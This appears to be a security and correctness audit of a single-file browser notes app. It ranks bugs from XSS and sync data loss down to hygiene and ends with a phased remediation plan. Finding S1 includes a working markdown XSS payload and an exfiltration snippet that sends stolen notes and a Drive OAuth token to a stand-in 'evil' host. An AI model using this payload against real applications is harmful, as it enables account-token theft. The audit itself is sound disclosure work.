# Audit — note.directory (index.html @ 8b336e0, 2026-10-09)

Scope: whole repo (single 10k-line `index.html`, docs, manifest, legal, skills).
Method: manual read of storage/URL/markdown/import/init; parallel deep reads of vim,
editor/highlight/search, Drive sync/tab leadership. Critical items reproduced in Node.

Severity: **P0** = security or silent data loss in common use · **P1** = data loss in
edge cases / clearly wrong behavior · **P2** = correctness/perf annoyances · **P3** = hygiene.

---

## P0 — fix immediately

### S1. Stored/reflected XSS via markdown links (confirmed)
`renderMarkdown` (4700–4929): backslash escapes are swapped for placeholders *before*
the link-scheme check and restored *after*, so `\:` hides the colon from the filter.

```
[click me](javascript\:alert\(document.domain\))
→ <a href="javascript:alert(document.domain)" ...>
```
The preview click handler (5470) doesn't intercept unknown hrefs, and CSP
`script-src 'unsafe-inline'` permits `javascript:` URLs. Attack: send a share link with
`?view=zen` — it renders immediately; one click runs script in the app origin with
access to every note in localStorage **and the Drive OAuth token** (`notepad_gdrive_token`).
Exfiltration via `location = 'https://evil/?'+data` is not blocked by CSP.

### D1. Background tab steals leadership → edits in the focused tab are lost
`init()` always `claimLeadership()` (10113). Open any note.directory link in a background
tab → the tab you're typing in is revoked (8788), `scheduleSave/saveState` become no-ops
(2864/2878), `beforeunload` skips saving (8869). Everything typed afterwards lives only in
memory and is gone on close. Very common trigger (middle-click a shared link).

### D2. Drive autosave pushes stale state over remote
`drivePushQuiet → gdriveUploadState` (9508, 9797) PATCHes the full local state without
pulling/merging and without `If-Match`. A long-lived tab reverts other devices' edits,
resurrects their deletions, and drops their new notes.

### D3. Lost-update races in Drive push
- `gdriveDirty = false` after the upload `await` (9803, 9685) wipes edits made during the upload.
- `revokeLeadership` clears `saveTimeout` without flushing (2777) → keystrokes in the last 300 ms before a tab switch are lost.
- `:w` in a non-leader tab deletes the swap and clears dirty although `saveState` was a no-op (7930) → edit gone.

### D4. Import-conflict modal breaks every later modal
`showImportModal` (3192/3210) restores buttons via `innerHTML`, so the cached
`modalConfirm`/`modalCancel` consts point at detached nodes. Afterwards the delete-confirm
modal shows stale labels and button clicks do nothing (only Enter/Esc work).

---

## P1 — data integrity & wrong behavior

| # | Where | Defect |
|---|---|---|
| 1 | 9649, 9756 | Sync conflict = whole-note last-writer-wins by device `Date.now()`; concurrent edits silently drop one side, clock skew picks the wrong one. |
| 2 | 9632, 9744 | Remote tombstone beats a later local edit unconditionally. |
| 3 | 2789, 8793 | `deletedIds` not propagated between tabs; reclaim writes back stale tombstones → deletions resurrect. |
| 4 | 9398–9436, 10191 | Interactive `gdriveAuth()` from timers/focus (no user gesture), no `error_callback` → promise never settles, `gdriveUploading` stuck true, sync dead for the session; popup on focus. |
| 5 | 9786, 9719, 9726 | `driveSyncQuiet` with newer local data does nothing (dirty flag false) and early returns leave the sync dot blinking forever; never creates the file if missing. |
| 6 | 9510, 9458 | No mutual exclusion; parallel first uploads create duplicate `note-app-data.json`, `files[0]` picks arbitrarily. |
| 7 | 8858/10204 | Two quiet syncs per focus (`reclaimLeadership` + `onTabResume`) racing on auth. |
| 8 | 9813 | Sign-out: re-connected by in-flight sync; not propagated to other tabs; `revoke()` skipped when GIS not loaded. |
| 9 | 8619 | Zip import with `.note.directory` metadata can insert a note whose `id` already exists under another name (renamed after export) → duplicate IDs. |
| 10 | 10073, 10087 | "help" / "markdown demo" silently overwrite any user note named `help.md`, `help-mobile.md`, `markdown-features.md`. |
| 11 | 8390, 2953 | `parseHashParams` → `decodeURIComponent` outside try; `note.directory/#%` → init rejects, blank app. |
| 12 | 5076 vs 4768 | Task checkbox index mismatch: renderer counts `1. [ ]` tasks, `parseTasks` doesn't (and counts tasks inside code fences) → clicking toggles the wrong checkbox (confirmed). |
| 13 | 6185, 6080, 3861 | Find/Replace indexes into `toLowerCase()` and applies to original text → `İ foo` + replace-all `foo→bar` gives `İ fbar` (confirmed by agent). |
| 14 | 6145 | `replaceCurrent`/`findNext` use cached offsets never invalidated on input → replaces the wrong text. |
| 15 | 3268–3325 | Undo within 400 ms of typing: pending snapshot fires after undo, kills redo and re-applies the edit on next undo. |
| 16 | 4021 | Swap recovery ignores timestamps; an old vim swap overwrites newer synced content. |
| 17 | 8701 | Multiple dropped files with conflicts open concurrent `showModal`s on the same DOM → one click answers all, texts overwrite each other. |
| 18 | 9236, 9259, 8057 | `showToast` is not defined → Ctrl+Shift+F / vim format throws `ReferenceError`. |
| 19 | 4169, 4214 | Rename-blur / pin bump `updatedAt` with no change → untouched note can win a sync merge. |
| 20 | vim 6854ff | Cursor can sit on `\n`: `$x`, `$r`, `5x` join lines. `dj/dk` charwise, `dw` eats newline+indent, `de` exclusive, `b` stalls, V-mode `>`/`J` hit one line too many, `.` after insert replays wrong text, `/foo` skips first match. These all mutate text differently than the user expects. |

## P2 — performance & UX

- **Regex backtracking**: CSS rule `/[a-z\-]+(?=\s*:\s)/g` (3458) and HTML attr `/\b[a-zA-Z\-:]+(?==)/g` (3471) are quadratic; 40 kB inputs → ~2 s per keystroke.
- **Full-document work per keystroke**: whole-doc re-highlight with `escapeHtml` creating a DOM node per token; wrap-mode line measurement forces one reflow per line (mobile default); vim helpers `split("\n")` the whole buffer 5–10× per motion; `updateCursorPos` → `saveState` (full JSON + localStorage scan) after mere arrow keys; occurrence markers unbounded.
- **Undo memory**: 200 full snapshots per note, never freed on delete, redo bypasses cap.
- Ctrl+Z/Ctrl+Shift+Z are global (9178) — fire while typing in find/search/rename inputs; redo unreachable on Win/Linux/Firefox (`e.key === "z"` with Shift is `"Z"`).
- Gutter keeps wrapped heights after toggling wrap off; cross-tab wrap toggle doesn't update gutter.
- Search caps at 40 hits in note order *before* scoring → best match can be dropped; only first 500 lines searched.
- Markdown: emphasis regexes run over generated HTML → `https://x.com/_a_` becomes `href=".../<em>a</em>"` (confirmed); escapes applied inside code spans; heading ids can collide with app ids (`# editor`).
- Vim: visual-mode inclusivity, `gg` in visual dead, `di)` on closing bracket, dot-repeat broken for `cw/ciw/cf/a/A/I`, counts (`2d3w`=23), `:s` doesn't substitute, stuck error bar swallows next command.

## P3 — hygiene / oddities

- **Privacy**: full note content is written into the URL on every edit (`updateUrl`, 2982) and pushed into history on every note switch → private notes land in browser history, history sync, screen shares, address-bar autocomplete. README's "never sent to servers" is true for the fragment but the exposure surface is much larger than users assume. Shared links also auto-persist into the recipient's storage without asking.
- **CSP**: `'unsafe-inline'` required only because of ~30 inline `onclick=` attributes; no `frame-ancestors` (can't be set via `<meta>`; GitHub Pages can't set headers) → clickjackable.
- `escapeHtml` doesn't escape quotes — safe today (text nodes only), a trap later.
- Zip: header-declared sizes trusted (zip bomb only self-inflicted); no UTF-8 flag (bit 11) on export → non-ASCII names garble in some unzippers; `..` filter rejects legit names like `a..b.md`; leading dot stripped (`.env` → `env`).
- README says "works fully offline" — there's no service worker; it only works offline from HTTP cache.
- `.nojekyl` is misspelled (should be `.nojekyll`) — currently harmless, but the file does nothing.
- Victor Mono (OFL) shipped without its license file.
- Dead code: `charCount`/`wordCount` refs (null), `getStorageUsed` duplicates `updateStorageUsage`, `ie.cnt`, `Math.min(0, …)`, triple-duplicated `J` and `>>`/`<<` logic, `createdAt` missing on `createNote` but present elsewhere, two ID schemes (`Date.now()+random` vs `randomUUID`).
- `deletedIds` grows forever and is uploaded on every sync.
- Remote Drive payload merged without the shape validation used for zip import.
- README line counts stale (~9900 vs 10223).

---

## Plan

Ordered by risk × effort. Each phase is independently shippable.

**Status:** Phase 1 done (9f4816e, JS moved to `app.js`, strict CSP). Phase 2 done
(merge-on-write replaces tab leadership for local saves; leadership now only gates
Drive sync). Phase 3 done (single serialized download→merge→upload sync,
three-way merge with conflict copies, no popups outside clicks; see
`docs/google-drive-flow.md`). Phase 4 done (vim engine rebuilt: parser,
motion table with inclusive/exclusive/linewise rules, key-replay dot repeat,
real `:s`). Phase 5 done (synchronous per-line highlight rendering — typed
text visible in ~1ms instead of ~45ms; no quadratic highlighter rules;
wrap mode measures from rendered rows; capped undo memory). Browser tests
in `tests/` (`npm test`). Phase 6 done (cleanup; README offline wording
instead of a service worker). Follow-ups: tombstones expire after 6 months;
page hidden when framed (JS clickjacking defense — a `frame-ancestors`
header would need a host that can set headers); `.` repeats visual changes.

### Phase 1 — security & crash fixes (½ day)
1. **S1**: in the link handler, run the scheme check on the *fully restored* URL (restore `\x00ES` placeholders first) and use an allowlist parse: `new URL(url, location.href)` → permit only `http:`, `https:`, `mailto:` or same-origin relative. In the preview click handler, `preventDefault()` for anything not allowlisted. Add regression strings to a test page.
2. Move inline `onclick=` handlers to `addEventListener` (one delegated listener with `data-action`), then drop `'unsafe-inline'` from `script-src`. This turns any future markdown bug into a non-event.
3. `showToast` → `showMdToast`.
4. Wrap `parseHashParams` decoding in try/catch; `init().catch(render)`.
5. **D4**: stop restoring via `innerHTML`; hide/show the three extra buttons instead, or re-query the buttons on each modal open. Serialize modals with a promise queue (fixes #17).

### Phase 2 — local data loss (1 day)
1. **D1/D3 tab leadership**: replace the "last-opened wins" scheme. Simplest robust option: every tab writes its own edits (merge-on-write: read storage, merge per note by `updatedAt`, write), and use the Web Locks API (`navigator.locks.request("drive-sync", …)`) only for Drive sync. If keeping leadership: never claim on init when another tab is visible; flush `saveTimeout` (don't clear) on revoke; let `beforeunload` save in every tab.
2. Propagate `deletedIds` in `pullStateFromStorage` and the storage handler (union).
3. `vimWriteBuffer` must not delete the swap unless the save actually happened.
4. Undo: cancel `historyTimeout` in `undo`/`redo`, scope it per note, enforce the cap in redo, free history on delete, make Ctrl+Z skip when focus is in another input, and handle `"Z"`.
5. Swap recovery: only apply when `swap.timestamp > note.updatedAt`.
6. Help/demo notes: create under a new name if a user note exists with different content.
7. Zip import: if `meta.id` already exists, assign a fresh id.
8. Checkbox mapping: emit tasks with source line numbers from the renderer and toggle by line, instead of re-counting with a different regex.
9. Find/replace: case-insensitive search via a regex built from the escaped query with flag `i` (or compare per position) so offsets refer to the original string; recompute matches on input.

### Phase 3 — Drive sync correctness (1–2 days)
1. One sync entry point guarded by a lock/in-flight promise; every path (push, quiet, manual) = download → merge → upload with `If-Match: <etag>`, retry on 412.
2. Dirty tracking via a monotonic counter (`dirtyGen`); clear only if unchanged since upload start.
3. Conflicts: if both sides changed since the last synced version (store `syncedAt`/`baseHash` per note), keep both (`name (conflict).md`) instead of LWW. Tombstones carry `deletedAt`; an edit newer than the tombstone wins.
4. Auth: never call interactive `requestAccessToken` outside a click handler; add `error_callback`; on failure, show "reconnect" state only.
5. Dedupe file lookup (`orderBy=createdTime`, delete extras on merge), handle missing file in quiet sync, remove the duplicate focus-time sync, make sign-out cancel in-flight work and broadcast via a storage key; always load GIS before revoke.
6. Validate the remote payload shape; GC tombstones older than N days.
7. Flush a pending Drive push on `visibilitychange: hidden` (`fetch(..., {keepalive:true})`).

### Phase 4 — vim semantics (1–2 days, optional)
Replace ad-hoc regex motions with a motion table `{fn, inclusive, linewise}` and one operator applicator. That fixes `dj/dk/dw/de/b/w/$x` together. Then clamp the normal-mode cursor to `lineEnd-1`, fix the insert-capture order for `.`, fix the V-mode end line, and dedupe `J`/`>>`. Add a small table-driven test (`input, cursor, keys → expected`) runnable in Node by extracting the vim functions.

### Phase 5 — performance (1 day)
- Anchor/rewrite the two quadratic regexes; cap highlighting (e.g. skip above 200 kB or highlight only the visible range).
- Replace `escapeHtml` with a string-replace version (also escape quotes).
- Wrap measurement: measure only dirty lines, or use a single mirror with per-line spans read in one pass.
- Cache line starts per edit for vim/cursor helpers; persist `cursorPos` on blur/switch only.
- Limit occurrence markers to the visible viewport and a max count.

### Phase 6 — hygiene (1 h)
Rename `.nojekyl` → `.nojekyll`; untrack `.claude/settings.json` (add to `.gitignore`); add the OFL license; fix the README offline claim (or add a 20-line service worker); delete dead code; set the UTF-8 flag in `buildZip`; decide whether note content belongs in the URL at all (opt-in "share" only, keep `?id=` for navigation).

*Correction:* `.claude/settings.json` was never tracked — that finding was a
misread of `.gitignore` output. Note content in the URL is intended (it is
the app's sharing model) and stays.

### Testing
There are no tests. Minimum viable: extract pure functions (`renderMarkdown`, `formatMarkdown`, `readZip`/`buildZip`, find/replace, vim motions, the sync merge) behind a `if (typeof module !== "undefined") module.exports = …` footer and run them with `node --test`, without a bundler. Write regression tests first for S1, task mapping, Turkish-İ replace and the merge rules.
